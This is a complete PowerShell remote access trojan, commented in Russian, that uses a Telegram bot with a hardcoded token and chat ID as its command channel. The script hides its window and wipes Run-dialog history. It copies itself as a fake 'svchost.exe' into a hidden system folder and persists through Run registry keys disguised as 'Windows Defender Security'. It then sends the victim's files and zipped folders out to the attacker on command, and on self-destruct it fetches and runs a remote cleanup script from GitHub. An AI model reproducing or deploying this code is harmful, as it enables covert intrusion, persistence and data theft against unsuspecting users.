# RAT через Telegram Bot
$Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
$ChatID = "5674514050"

# Установка кодировки UTF-8 для корректного отображения русских символов
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$PSDefaultParameterValues['*:Encoding'] = 'utf8'

# Настройки скрытности
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.IO.Compression.FileSystem

# Скрытие окна PowerShell
$windowCode = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
$windowAPI = Add-Type -MemberDefinition $windowCode -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
$windowAPI::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0) | Out-Null

# Очистка истории RUN при запуске
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue

# Функция отправки сообщений с правильной кодировкой
function Send-Telegram {
    param([string]$Message, [string]$FilePath = $null)
    
    $lastMessage = $global:LastSentMessage
    if ($Message -eq $lastMessage) { return }
    $global:LastSentMessage = $Message
    
    $url = "https://api.telegram.org/bot$Token/sendMessage"
    $body = @{
        chat_id = $ChatID
        text = $Message
    }
    
    try {
        $jsonBody = $body | ConvertTo-Json
        $response = Invoke-RestMethod -Uri $url -Method Post -Body $jsonBody -ContentType "application/json; charset=utf-8" -UseBasicParsing
    } catch { 
        try {
            # Альтернативный метод с формой
            $form = @{
                chat_id = $ChatID
                text = $Message
            }
            $response = Invoke-RestMethod -Uri $url -Method Post -Body $form -UseBasicParsing
        } catch { }
    }
    
    if ($FilePath -and (Test-Path $FilePath)) {
        Send-TelegramFile -FilePath $FilePath
    }
}

# Функция отправки файлов
function Send-TelegramFile {
    param([string]$FilePath)
    
    $url = "https://api.telegram.org/bot$Token/sendDocument"
    
    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
        $boundary = [System.Guid]::NewGuid().ToString()

        $bodyLines = (
            "--$boundary",
            "Content-Disposition: form-data; name=`"chat_id`"",
            "",
            $ChatID,
            "--$boundary",
            "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
            "Content-Type: application/octet-stream",
            "",
            $fileEnc,
            "--$boundary--"
        ) -join "`r`n"

        Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines -UseBasicParsing
    } catch {
        try {
            # Резервный метод отправки файла
            $fileInfo = Get-Item $FilePath
            $fileStream = [System.IO.File]::OpenRead($FilePath)
            $form = @{
                chat_id = $ChatID
                document = $fileStream
            }
            Invoke-RestMethod -Uri $url -Method Post -Form $form -UseBasicParsing
            $fileStream.Close()
        } catch { }
    }
}

# Функция создания ZIP архива
function Compress-Folder {
    param([string]$FolderPath, [string]$ZipPath)
    
    try {
        [System.IO.Compression.ZipFile]::CreateFromDirectory($FolderPath, $ZipPath, [System.IO.Compression.CompressionLevel]::Fastest, $false)
        return $true
    } catch {
        try {
            # Резервный метод архивации через COM
            $shell = New-Object -ComObject Shell.Application
            $zipFolder = $shell.NameSpace($ZipPath)
            $sourceFolder = $shell.NameSpace($FolderPath)
            $zipFolder.CopyHere($sourceFolder.Items())
            Start-Sleep -Seconds 3
            return $true
        } catch {
            return $false
        }
    }
}

# Уникальная установка в автозагрузку - скрытая папка в System32 с рандомным именем
$hiddenFolder = "$env:WINDIR\System32\Microsoft.NET\Framework64\v4.0.30319\Config"
if (!(Test-Path $hiddenFolder)) { 
    New-Item -Path $hiddenFolder -ItemType Directory -Force | Out-Null
    # Скрываем папку системным атрибутом
    attrib +s +h "$hiddenFolder" 2>&1 | Out-Null
}
$scriptPath = "$hiddenFolder\svchost.exe"

# Копируем скрипт в скрытое место
$scriptContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw
$scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8

# Установка в несколько мест автозагрузки для надежности
$regPaths = @(
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
)

foreach ($regPath in $regPaths) {
    try {
        if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
        Set-ItemProperty -Path $regPath -Name "Windows Defender Security" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue
    } catch { }
}

# Основные переменные
$currentDir = "C:\"
$global:LastSentMessage = ""

# Отправка информации о запуске
Send-Telegram "RAT активирован на $env:COMPUTERNAME
Доступные команды:
/help - список команд
/ls - список файлов
/cd [папка] - сменить директорию
/download [файл] - скачать файл
/selfdestruct - самоуничтожение"

# Основной цикл опроса
while ($true) {
    try {
        $offset = if ($global:LastUpdateId) { $global:LastUpdateId + 1 } else { 0 }
        $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$offset&timeout=60" -Method Get -UseBasicParsing
        
        if ($updates.ok -and $updates.result.Count -gt 0) {
            foreach ($update in $updates.result) {
                $global:LastUpdateId = $update.update_id
                
                if ($update.message.chat.id -eq $ChatID) {
                    $command = $update.message.text
                    
                    # Обработка команд
                    switch -regex ($command) {
                        "^/help$" {
                            Send-Telegram "Доступные команды:
/help - показать это сообщение
/ls - список файлов в текущей директории
/cd [папка] - сменить директорию
/download [файл] - скачать файл или папку
/selfdestruct - самоуничтожение RAT"
                        }
                        "^/ls$" {
                            $items = Get-ChildItem -Path $currentDir -Force
                            $fileList = @()
                            foreach ($item in $items) {
                                $type = if ($item.PSIsContainer) { "📁" } else { "📄" }
                                $size = if (!$item.PSIsContainer -and $item.Length) { " ($([math]::Round($item.Length/1KB,2)) KB)" } else { "" }
                                $fileList += "$type $($item.Name)$size"
                            }
                            Send-Telegram "Содержимое $currentDir
$($fileList -join "`n")"
                        }
                        "^/cd (.+)$" {
                            $newDir = $matches[1].Trim()
                            if ($newDir -eq "..") {
                                $currentDir = Split-Path $currentDir -Parent
                                if (!$currentDir) { $currentDir = "C:\" }
                            } else {
                                $testPath = Join-Path $currentDir $newDir
                                if (Test-Path $testPath -PathType Container) {
                                    $currentDir = $testPath
                                } else {
                                    Send-Telegram "Директория не найдена: $newDir"
                                    continue
                                }
                            }
                            
                            # Отправляем содержимое новой директории с помощью /ls
                            $items = Get-ChildItem -Path $currentDir -Force
                            $fileList = @()
                            foreach ($item in $items) {
                                $type = if ($item.PSIsContainer) { "📁" } else { "📄" }
                                $size = if (!$item.PSIsContainer -and $item.Length) { " ($([math]::Round($item.Length/1KB,2)) KB)" } else { "" }
                                $fileList += "$type $($item.Name)$size"
                            }
                            Send-Telegram "/ls $currentDir
$($fileList -join "`n")"
                        }
                        "^/download (.+)$" {
                            $target = $matches[1].Trim()
                            $fullPath = Join-Path $currentDir $target
                            
                            if (Test-Path $fullPath) {
                                if (Test-Path $fullPath -PathType Container) {
                                    # Архивируем папку
                                    $zipPath = "$env:TEMP\$([System.IO.Path]::GetRandomFileName()).zip"
                                    if (Compress-Folder -FolderPath $fullPath -ZipPath $zipPath) {
                                        Send-Telegram "Папка $target заархивирована" $zipPath
                                        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
                                    } else {
                                        Send-Telegram "Ошибка архивации папки: $target"
                                    }
                                } else {
                                    Send-Telegram "Файл $target отправлен" $fullPath
                                }
                            } else {
                                Send-Telegram "Файл/папка не найдены: $target"
                            }
                        }
                        "^/selfdestruct$" {
                            Send-Telegram "🔄 Запуск процедуры самоуничтожения..."
                            
                            try {
                                # Загружаем и выполняем скрипт очистки
                                $cleanupScript = Invoke-RestMethod -Uri "https://raw.githubusercontent.com/imsog/system-scanner/refs/heads/main/cleanup.ps1" -UseBasicParsing
                                
                                # Создаем временный файл для скрипта очистки
                                $cleanupPath = "$env:TEMP\cleanup_$(Get-Random).ps1"
                                $cleanupScript | Out-File -FilePath $cleanupPath -Encoding UTF8
                                
                                # Запускаем скрипт очистки в отдельном процессе
                                $process = Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$cleanupPath`"" -PassThru
                                
                                # Ждем завершения процесса очистки
                                $process.WaitForExit(30000) # 30 секунд таймаут
                                
                                if ($process.HasExited -and $process.ExitCode -eq 0) {
                                    Send-Telegram "✅ Самоуничтожение успешно завершено"
                                } else {
                                    Send-Telegram "⚠️ Самоуничтожение завершено с ошибками, выполняется ручная очистка..."
                                    
                                    # Ручная очистка если автоматическая не сработала
                                    # Очистка истории RUN
                                    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
                                    
                                    # Удаление из автозагрузки
                                    foreach ($regPath in $regPaths) {
                                        try {
                                            Remove-ItemProperty -Path $regPath -Name "Windows Defender Security" -Force -ErrorAction SilentlyContinue
                                        } catch { }
                                    }
                                    
                                    # Удаление файлов
                                    $filesToDelete = @(
                                        $scriptPath,
                                        $MyInvocation.MyCommand.Path,
                                        $cleanupPath
                                    )
                                    
                                    foreach ($file in $filesToDelete) {
                                        if (Test-Path $file) { 
                                            try {
                                                Remove-Item $file -Force -ErrorAction SilentlyContinue 
                                            } catch {
                                                # Пытаемся переименовать и удалить после перезагрузки
                                                try {
                                                    $newName = "$file.todelete"
                                                    Rename-Item $file $newName -ErrorAction SilentlyContinue
                                                    cmd /c "del /f /q `"$newName`"" 2>&1 | Out-Null
                                                } catch { }
                                            }
                                        }
                                    }
                                    
                                    # Завершаем процессы RAT
                                    $currentPID = $pid
                                    Get-WmiObject Win32_Process | Where-Object { 
                                        $_.CommandLine -like "*$scriptPath*" -or 
                                        $_.CommandLine -like "*$($MyInvocation.MyCommand.Path)*" 
                                    } | ForEach-Object { 
                                        if ($_.ProcessId -ne $currentPID) {
                                            Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
                                        }
                                    }
                                    
                                    Send-Telegram "✅ Ручная очистка завершена, RAT уничтожен"
                                }
                                
                                # Завершаем текущий процесс
                                Stop-Process -Id $pid -Force
                                
                            } catch {
                                Send-Telegram "❌ Ошибка при самоуничтожении: $($_.Exception.Message)"
                                
                                # Аварийная очистка
                                try {
                                    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
                                    foreach ($regPath in $regPaths) {
                                        Remove-ItemProperty -Path $regPath -Name "Windows Defender Security" -Force -ErrorAction SilentlyContinue -ErrorAction SilentlyContinue
                                    }
                                    Stop-Process -Id $pid -Force
                                } catch {
                                    # Принудительное завершение
                                    cmd /c "taskkill /f /pid $pid" 2>&1 | Out-Null
                                }
                            }
                        }
                    }
                }
            }
        }
    } catch { 
        Start-Sleep -Seconds 5
    }
}
